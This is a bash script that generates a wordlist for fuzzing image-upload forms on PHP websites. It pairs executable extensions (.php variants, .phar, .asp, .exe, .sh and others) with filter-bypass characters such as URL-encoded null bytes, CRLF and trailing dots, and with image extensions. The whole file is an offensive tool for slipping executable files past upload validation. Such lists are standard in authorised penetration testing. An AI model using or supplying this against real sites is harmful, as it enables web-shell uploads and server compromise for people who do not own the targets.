#!/bin/bash

#This script generates an approximately comprehensive list of extensions for fuzzing image-upload forms on a php-based website to find upload-vulnerabilities.

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' 'â€¦' ':'; do
        for ext in '.php' '.phps' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.pht' '.phtml' '.phar' '.phpt' '.pgif' '.phtm' \
                '.asp' '.aspx' \
                '.bat' '.exe' '.com' '.dll' '.hta' \
                '.c' '.cfm' '.cgi' '.css' '.inc' '.js' '.jsa' '.jsp' '.jhtml' \
                '.log' '.mdb' '.nsf' '.pcap' '.pl' '.reg' '.sh' '.shtml' '.sql' '.swf' '.txt' '.xml'; do
                echo "$char$ext.jpg" >> upl_ext_fuz.lst
                echo "$ext$char.jpg" >> upl_ext_fuz.lst
                echo ".jpg$char$ext" >> upl_ext_fuz.lst
                echo ".jpg$ext$char" >> upl_ext_fuz.lst
                echo "$char$ext.png" >> upl_ext_fuz.lst
                echo "$ext$char.png" >> upl_ext_fuz.lst
                echo ".png$char$ext" >> upl_ext_fuz.lst
                echo ".png$ext$char" >> upl_ext_fuz.lst
                echo "$char$ext.jpeg" >> upl_ext_fuz.lst
                echo "$ext$char.jpeg" >> upl_ext_fuz.lst
                echo ".jpeg$char$ext" >> upl_ext_fuz.lst
                echo ".jpeg$ext$char" >> upl_ext_fuz.lst
                echo "$char$ext.gif" >> upl_ext_fuz.lst
                echo "$ext$char.gif" >> upl_ext_fuz.lst
                echo ".gif$char$ext" >> upl_ext_fuz.lst
                echo ".gif$ext$char" >> upl_ext_fuz.lst
        done
done
